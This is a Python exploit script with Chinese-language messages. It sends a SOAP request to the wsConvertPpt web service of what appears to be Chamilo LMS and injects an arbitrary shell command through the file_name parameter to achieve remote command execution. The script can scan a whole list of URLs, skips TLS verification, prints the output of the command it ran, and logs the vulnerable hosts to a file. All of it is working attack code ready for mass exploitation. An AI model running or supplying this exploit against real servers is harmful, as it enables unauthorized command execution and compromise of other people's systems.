import argparse,warnings,requests
import xml.etree.ElementTree as ET
warnings.filterwarnings("ignore")
def Kill_ALL(url, command):
    body = f'''<?xml version="1.0" encoding="UTF-8"?>
    <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns1="{url}" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:ns2="http://xml.apache.org/xml-soap" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><ns1:wsConvertPpt><param0 xsi:type="ns2:Map"><item><key xsi:type="xsd:string">file_data</key><value xsi:type="xsd:string"></value></item><item><key xsi:type="xsd:string">file_name</key><value xsi:type="xsd:string">`{{}}`.pptx'|" |{command}||a #</value></item><item><key xsi:type="xsd:string">service_ppt2lp_size</key><value xsi:type="xsd:string">720x540</value></item></param0></ns1:wsConvertPpt></SOAP-ENV:Body></SOAP-ENV:Envelope>'''
    try:
        response = requests.post('{}/main/webservices/additional_webservices.php'.format(url), data=body, headers={
            'Content-Type': 'text/xml; charset=utf-8',
        }, verify = False,timeout = 7)
    except Exception as e:
        print("[Error] 自行调试，错误：", str(e))
        return False
    if response.status_code == 200 and "wsConvertPptResponse" in response.text:
        kill = ET.fromstring(response.text)
        return_tag = kill.find('.//return')
        if return_tag is not None:
            content = return_tag.text
            print(f"[Success] 存在漏洞！   执行结果: {content}")
        else:
            print("未找到执行结果，手动检查")
        with open('Kill_All.txt', "a+") as file:
            file.write(url + "\n")
        return True
    else:
        return False
parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url", help="完整URL地址(http/https)")
parser.add_argument("-f", "--file", help="批量URL文件")
parser.add_argument("-c", "--command", help="执行命令,可选")
args = parser.parse_args()
if args.command is None:
    command = 'whoami'
else:
    command = args.command
if args.file is None:
    urls = [args.url]
else:
    with open(args.file, "r") as url_file:
        urls = url_file.readlines()
for url in urls:
    url = url.strip()
    if Kill_ALL(url, command):
        pass
    else:
        print(f"[False] 不存在漏洞/命令执行失败: {url}")
